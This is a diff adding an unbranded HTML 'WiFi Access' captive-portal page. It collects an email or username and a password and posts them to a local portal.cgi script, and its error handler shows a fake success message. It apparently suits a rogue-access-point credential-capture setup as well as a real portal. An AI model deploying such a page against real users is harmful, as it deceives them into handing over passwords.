@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WiFi Authentication</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.12);padding:36px 32px;max-width:400px;width:100%}
+.logo{text-align:center;margin-bottom:24px}
+.logo .icon{font-size:48px;line-height:1}
+.logo h1{font-size:20px;font-weight:700;color:#1a1a2e;margin-top:10px}
+.logo p{font-size:13px;color:#666;margin-top:4px}
+.field{margin-bottom:16px}
+label{display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:6px}
+input[type=text],input[type=password],input[type=email]{width:100%;border:1.5px solid #dde1e7;border-radius:8px;padding:11px 14px;font-size:14px;outline:none;transition:border-color .15s}
+input:focus{border-color:#4a90d9}
+.btn-submit{width:100%;background:#4a90d9;color:#fff;border:none;border-radius:8px;padding:13px;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px;transition:background .15s}
+.btn-submit:hover{background:#357abd}
+.footer{text-align:center;margin-top:20px;font-size:11px;color:#aaa}
+.msg{text-align:center;padding:12px;border-radius:8px;font-size:13px;margin-bottom:16px}
+.msg.ok{background:#e6f4ea;color:#1e7e34}
+.msg.err{background:#fce8e8;color:#b71c1c}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">
+    <div class="icon">&#x1F4F6;</div>
+    <h1>WiFi Access</h1>
+    <p>Sign in to connect to the internet</p>
+  </div>
+
+  <div id="msg" class="msg" style="display:none"></div>
+
+  <form id="portal-form" onsubmit="submitCreds(event)">
+    <div class="field">
+      <label for="user">Email or Username</label>
+      <input type="text" id="user" name="user" placeholder="your@email.com" autocomplete="username" required>
+    </div>
+    <div class="field">
+      <label for="pass">Password</label>
+      <input type="password" id="pass" name="pass" placeholder="Password" autocomplete="current-password" required>
+    </div>
+    <button type="submit" class="btn-submit" id="submit-btn">Connect</button>
+  </form>
+
+  <div class="footer">By connecting you agree to our Terms of Service</div>
+</div>
+
+<script>
+function submitCreds(e) {
+  e.preventDefault();
+  const btn = document.getElementById('submit-btn');
+  const msg = document.getElementById('msg');
+  const user = document.getElementById('user').value;
+  const pass = document.getElementById('pass').value;
+  btn.disabled = true;
+  btn.textContent = 'Connecting...';
+
+  const body = 'user=' + encodeURIComponent(user) + '&pass=' + encodeURIComponent(pass);
+  fetch('cgi-bin/portal.cgi?action=submit', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: body
+  })
+  .then(r => r.json())
+  .then(j => {
+    if (j.ok) {
+      msg.textContent = 'Connected! Redirecting...';
+      msg.className = 'msg ok';
+      msg.style.display = '';
+      document.getElementById('portal-form').style.display = 'none';
+      setTimeout(() => { window.location.href = 'http://www.google.com'; }, 1500);
+    } else {
+      msg.textContent = 'Error: ' + (j.error || 'Try again');
+      msg.className = 'msg err';
+      msg.style.display = '';
+      btn.disabled = false;
+      btn.textContent = 'Connect';
+    }
+  })
+  .catch(() => {
+    // Fallback: just redirect after "success"
+    msg.textContent = 'Redirecting...';
+    msg.className = 'msg ok';
+    msg.style.display = '';
+    setTimeout(() => { window.location.href = '/'; }, 1500);
+  });
+}
+</script>
+</body>
+</html>
